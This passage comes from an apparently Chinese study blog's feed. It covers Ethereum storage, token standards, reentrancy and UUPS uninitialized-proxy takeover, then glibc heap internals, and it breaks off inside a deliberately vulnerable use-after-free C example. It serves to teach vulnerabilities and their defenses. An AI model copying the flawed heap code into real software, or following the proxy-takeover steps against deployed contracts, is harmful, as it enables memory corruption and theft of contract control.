&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内存模型：
&lt;ul&gt;
&lt;li&gt;栈
&lt;ul&gt;
&lt;li&gt;结构
&lt;ul&gt;
&lt;li&gt;2字节，最深1024层&lt;/li&gt;
&lt;li&gt;易失性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内存
&lt;ul&gt;
&lt;li&gt;结构
&lt;ul&gt;
&lt;li&gt;按字寻址的字节数组，可动态扩展&lt;/li&gt;
&lt;li&gt;易失性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作指令
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mload(offset)&lt;/code&gt;: 从内存偏移量处读32字节&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mstore(offset,value)&lt;/code&gt;: 将32字节&lt;code&gt;value&lt;/code&gt;写入偏移量&lt;code&gt;offset&lt;/code&gt;处&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gas成本: 初始免费，扩容时按每32字节支付Gas&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;存储
&lt;ul&gt;
&lt;li&gt;结构
&lt;ul&gt;
&lt;li&gt;每个合约有独立的持久化键值存储&lt;/li&gt;
&lt;li&gt;映射规则: 2^256个键，每个键对应一个32字节的值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特性
&lt;ul&gt;
&lt;li&gt;持久化: 数据永久写入区块链状态&lt;/li&gt;
&lt;li&gt;高Gas成本: 写入消耗成千乃至上万Gas&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作指令
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sstore(key,value)&lt;/code&gt;: 从栈上依次弹出&lt;code&gt;value&lt;/code&gt;和&lt;code&gt;key&lt;/code&gt;，将&lt;code&gt;value&lt;/code&gt;存入存储中&lt;code&gt;key&lt;/code&gt;对应的槽位&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sload(key)&lt;/code&gt;: 从栈顶弹出&lt;code&gt;key&lt;/code&gt;，将存储中&lt;code&gt;key&lt;/code&gt;对应的槽位的数据压入栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;代币合约&#34;&gt;代币合约
&lt;/h3&gt;&lt;h4 id=&#34;erc-20代币合约&#34;&gt;ERC-20代币合约
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;ERC-20是一种通用的智能合约规范，特点是每一个代币都和其他代币完全相等。它是资产通证化的最广泛使用标准&lt;/li&gt;
&lt;li&gt;包含API方法和事件
&lt;ul&gt;
&lt;li&gt;totalSupply: 定义token总供应量&lt;/li&gt;
&lt;li&gt;balancdOf: 返回钱包地址包含的token余额&lt;/li&gt;
&lt;li&gt;transfer: 从总供应中转移一定数量token并发给用户&lt;/li&gt;
&lt;li&gt;transferFrom: 在用户之间传输token&lt;/li&gt;
&lt;li&gt;approve: 验证是否允许在考虑总供应量的情况下分配一定的token&lt;/li&gt;
&lt;li&gt;allowance: 检查是否有余额向另一个账户发送token&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;uniswap&#34;&gt;Uniswap
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Uniswap是一个完成不同代币间的交易的&lt;strong&gt;自动化流动协议&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;注：自动化流动协议定义
&lt;ul&gt;
&lt;li&gt;自动化流动性协议是一种利用预定义的数学公式（如恒定乘积公式）和部署在区块链上的智能合约，自动管理用户贡献的资产池（流动性池），并为用户提供无需许可、去中心化、自动定价和执行的代币交换服务的系统。它完全消除了对传统订单簿和专业做市商的依赖，通过算法和社区提供的流动性实现市场功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;每个（或对）Uniswap智能合约管理着一个由两个ERC-20代币储备组成的流动池&lt;/li&gt;
&lt;li&gt;任何人都可以成为池的流动性提供者（LP），即存入基础代币来换取池代币&lt;/li&gt;
&lt;li&gt;在池中维持价格：套利&lt;/li&gt;
&lt;li&gt;货币对充当市商的角色，根据恒定乘积公式提供替换服务&lt;/li&gt;
&lt;li&gt;恒定乘积公式可以简单地表示为$x * y = k$，说明交易不能改变一对储备余额的乘积&lt;/li&gt;
&lt;li&gt;$k$通常被称为不变量。这个公式对规模较大的交易的执行速度比小的要慢得多&lt;/li&gt;
&lt;li&gt;在实践中Uniswap对交易收取0.30%的费用，这笔费用被存入储备中&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;erc-777代币合约&#34;&gt;ERC-777代币合约
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;被ERC-20类似，ERC-777也是一种可替换代币标准，交易时允许更复杂的交互&lt;/li&gt;
&lt;li&gt;它的最重要功能是接收hook&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;etheremu安全漏洞和攻击方式&#34;&gt;Etheremu安全漏洞和攻击方式
&lt;/h3&gt;&lt;h4 id=&#34;重进入攻击&#34;&gt;重进入攻击
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;核心漏洞：“先提款后记账”&lt;/li&gt;
&lt;li&gt;具体实现：在提款函数(withdraw)中递归调用，在记录的存款变化前反复提取存款&lt;/li&gt;
&lt;li&gt;防御方式：
&lt;ul&gt;
&lt;li&gt;检查-效果-交互模式: 按照执行检查、改变状态变量、执行与其他合同的交互的顺序运行&lt;/li&gt;
&lt;li&gt;使用修饰符锁定（互斥锁）: 即设置一个标识符，当发生与其他合同交互时设置标识符，标识符重置1前无法再进行交互&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;调用与委托调用攻击&#34;&gt;调用与委托调用攻击
&lt;/h4&gt;&lt;h5 id=&#34;基本概念调用与委托调用&#34;&gt;基本概念：调用与委托调用
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;调用: 调用另一个智能合约中的函数&lt;/li&gt;
&lt;li&gt;委托调用: 执行来自另一个智能合约的函数，使用调用者的存储和上下文&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;uups通用可升级代理标准&#34;&gt;UUPS(通用可升级代理标准)
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;架构: 代理合约拆分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;示意图&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/UUPS.png&#34; alt=&#34;UUPSUUPS&#34; width=&#34;75%&#34;&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;代理合约(&lt;strong&gt;Proxy&lt;/strong&gt;)
&lt;ul&gt;
&lt;li&gt;永久储存所有状态变量&lt;/li&gt;
&lt;li&gt;持有逻辑合约地址&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;fallback&lt;/code&gt;函数将所有调用用&lt;code&gt;delegatecall&lt;/code&gt;转发给逻辑合约&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;逻辑合约(&lt;strong&gt;Logic&lt;/strong&gt;)
&lt;ul&gt;
&lt;li&gt;包含实际业务代码&lt;/li&gt;
&lt;li&gt;无状态&lt;/li&gt;
&lt;li&gt;可被替换（升级）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;uups漏洞-未初始化&#34;&gt;UUPS漏洞: 未初始化
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;如果UUPS合同未初始化，那么攻击者可以调用&lt;code&gt;initialize()&lt;/code&gt;函数，实现“攻击者成为所有者”&lt;/li&gt;
&lt;li&gt;攻击步骤
&lt;ul&gt;
&lt;li&gt;攻击者成为所有者&lt;/li&gt;
&lt;li&gt;部署恶意合约&lt;/li&gt;
&lt;li&gt;劫持升级过程&lt;/li&gt;
&lt;li&gt;执行恶意代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>堆漏洞</title>
        <link>https://example.com/p/%E5%A0%86%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Fri, 11 Jul 2025 22:01:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E5%A0%86%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;heap-vulnerabilities&#34;&gt;Heap vulnerabilities
&lt;/h1&gt;&lt;h2 id=&#34;前置知识mallocfree&#34;&gt;前置知识：malloc/free
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;堆通过malloc/free来管理空间。可能存在如下安全漏洞：
&lt;ul&gt;
&lt;li&gt;释放后使用（UAF）&lt;/li&gt;
&lt;li&gt;双重释放&lt;/li&gt;
&lt;li&gt;差一错误&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;堆的使用规范&#34;&gt;堆的使用规范
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;当malloc的指针传递给free后禁止再对该指针进行读写操作&lt;/li&gt;
&lt;li&gt;不要在堆分配中使用或泄漏未初始化的信息&lt;/li&gt;
&lt;li&gt;不要读取或写入超过堆分配结束的字节&lt;/li&gt;
&lt;li&gt;不要重复传递从malloc到free的指针&lt;/li&gt;
&lt;li&gt;在分配开始前不要读取或写入字节&lt;/li&gt;
&lt;li&gt;不要传递不是由malloc初始化的指针给free&lt;/li&gt;
&lt;li&gt;在检查函数是否返回NULL前不要引用malloc指针&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;堆的内存分配&#34;&gt;堆的内存分配
&lt;/h2&gt;&lt;h3 id=&#34;内存分配方式&#34;&gt;内存分配方式
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;堆内存是通过从内核调用sbrk系统来分配的&lt;/li&gt;
&lt;li&gt;使用mmap来处理大内存分配，这是堆外分配，不在下面的讨论之内&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;堆相关微观结构&#34;&gt;堆相关微观结构
&lt;/h3&gt;&lt;h4 id=&#34;malloc_chunk&#34;&gt;malloc_chunk
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;我们称malloc申请的内存为&lt;code&gt;chunk&lt;/code&gt;，在ptmalloc内部用&lt;code&gt;malloc_chunk&lt;/code&gt;结构体表示，定义如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc_chunk&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;INTERNAL_SIZE_T&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prev_size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* 前一个相邻块的大小（仅当它空闲时有效）。否则被当前块的用户数据覆盖*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;INTERNAL_SIZE_T&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/*存储当前块的总大小（字节数）*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* 前向指针 - 仅空闲时有效 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;cm&#34;&gt;/* 后向指针 - 仅空闲时有效 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd_nextsize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* 大块专用：指向下一个不同大小的块 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bk_nextsize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* 大块专用：指向上一个不同大小的块 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;字段解释：
&lt;ul&gt;
&lt;li&gt;prev_size: 如果该&lt;code&gt;chunk&lt;/code&gt;的物理相邻的前一个&lt;code&gt;chunk&lt;/code&gt;是空闲的，在这里记录前一个&lt;code&gt;chunk&lt;/code&gt;的大小；否则这里记录的是前一个&lt;code&gt;chunk&lt;/code&gt;的数据。&lt;/li&gt;
&lt;li&gt;size: 该&lt;code&gt;chunk&lt;/code&gt;的大小，该大小必须是&lt;code&gt;MALLOC_ ALIGNMENT&lt;/code&gt;的整数倍。如果不是，那么会被转换为满足大小的最小的&lt;code&gt;MALLOC_ ALIGNMENT&lt;/code&gt;的整数倍，这通过&lt;code&gt;request2size()&lt;/code&gt;宏完成。另外该字段的低三位对不记录大小，它们从高到低分别表示：
&lt;ul&gt;
&lt;li&gt;NON_MAIN_ARENA: 记录当前&lt;code&gt;chunk&lt;/code&gt;是否不属于主线程，1表示不属于，0表示属于&lt;/li&gt;
&lt;li&gt;IS_MAPPED: 记录当前&lt;code&gt;chunk&lt;/code&gt;是否是被mmap分配的&lt;/li&gt;
&lt;li&gt;PREV_INUSE: 记录前一个&lt;code&gt;chunk&lt;/code&gt;块是否被分配。一般来说，队中的第一个被分配的&lt;code&gt;chunk&lt;/code&gt;块的size字段的P位都会设置为1，以防止访问前面的非法内存。当一个&lt;code&gt;chunk&lt;/code&gt;的size地段的P位为0时，可以通过&lt;code&gt;prev_size&lt;/code&gt;字段来获取上一个&lt;code&gt;chunk&lt;/code&gt;的大小以及内存地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;fd,bk: &lt;code&gt;chunk&lt;/code&gt;处于分配状态时，从fd字段开始是用户的数据。&lt;code&gt;chunk&lt;/code&gt;空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下
&lt;ul&gt;
&lt;li&gt;fd指向下一个（非物理相邻）空闲的&lt;code&gt;chunk&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;bk指向上一个（非物理相邻）空闲的&amp;rsquo;chunk`&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;fd_nextsize， bk_nextsize: 也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。
&lt;ul&gt;
&lt;li&gt;fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。&lt;/li&gt;
&lt;li&gt;bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。&lt;/li&gt;
&lt;li&gt;一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chunk&lt;/code&gt;结构
&lt;ul&gt;
&lt;li&gt;栈示意图：&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/41.png&#34; alt=&#34;Canary&#34; width=&#34;70%&#34;&gt;
&lt;/p&gt;
* 一个已经分配的 chunk 的样子如上。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。
当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。
* 被释放的`chunk`被记录在链表中（可能是循环双向链表，也可能是单向链表）。可以发现如果一个`chunk`处于free状态，会有两个位置记录其相应的大小。即本身的size字段和后面的`chunck`。一般情况下，物理相邻的两个空闲`chunck`会被合并为一个。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲`chunk`块
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;bin&#34;&gt;bin
&lt;/h4&gt;&lt;h5 id=&#34;bin的定义&#34;&gt;bin的定义
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;堆管理器需要跟踪释放的块，以便malloc可以在分配请求期间重用它们&lt;/li&gt;
&lt;li&gt;堆管理器维护一系列被称为&amp;quot;bin&amp;quot;的列表来最大限度地提高分配和释放的速度&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;bin的分类&#34;&gt;bin的分类
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;共有5种容器：62个小容器，63个大容器，1个未排序容器，10个高速缓存容器，以及每个线程独有的64个线程缓存容器（如果启用）&lt;/li&gt;
&lt;li&gt;小容器、大容器以及未排序容易被用于实现堆的基本回收策略，高速缓存容器和线程缓存容器则是实现优化&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;small-bin&#34;&gt;small bin
&lt;/h6&gt;&lt;h6 id=&#34;large-bin&#34;&gt;large bin
&lt;/h6&gt;&lt;h6 id=&#34;unsorted-bin&#34;&gt;unsorted bin
&lt;/h6&gt;&lt;h6 id=&#34;fast-bin&#34;&gt;fast bin
&lt;/h6&gt;&lt;h6 id=&#34;tchache-bin&#34;&gt;tchache bin
&lt;/h6&gt;&lt;h3 id=&#34;堆相关宏观结构&#34;&gt;堆相关宏观结构
&lt;/h3&gt;&lt;h4 id=&#34;arena&#34;&gt;Arena
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;每个arena就是一个独立的堆，独立地管理chunk和bin&lt;/li&gt;
&lt;li&gt;对于每个新加入的线程，会试图找到一个没有其他线程正在使用的arena，并且将该arena附加到该线程上。&lt;/li&gt;
&lt;li&gt;如果所有arena都被现有的线程使用，那么会创建一个新的arena，注意arena数量存在上限，对于32位架构为&lt;code&gt;2*CPU内核数&lt;/code&gt;，对于64位架构为&lt;code&gt;8*CPU内核数&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;如果arena数量达到上限，将会出现线程共用aren以及随之而来的线程等待的可能。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;堆上漏洞&#34;&gt;堆上漏洞
&lt;/h2&gt;&lt;h3 id=&#34;uafuse-after-free&#34;&gt;UAF(USE-AFTER-FREE)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;错误：在释放了堆上的内存后引用（又名悬垂指针引用）&lt;/li&gt;
&lt;li&gt;后果：攻击者可以使用被释放的指针控制数据写入&lt;/li&gt;
&lt;li&gt;错误示例：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFSIZE1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFSIZE2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;buf3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFSIZE3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BUFSIZE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
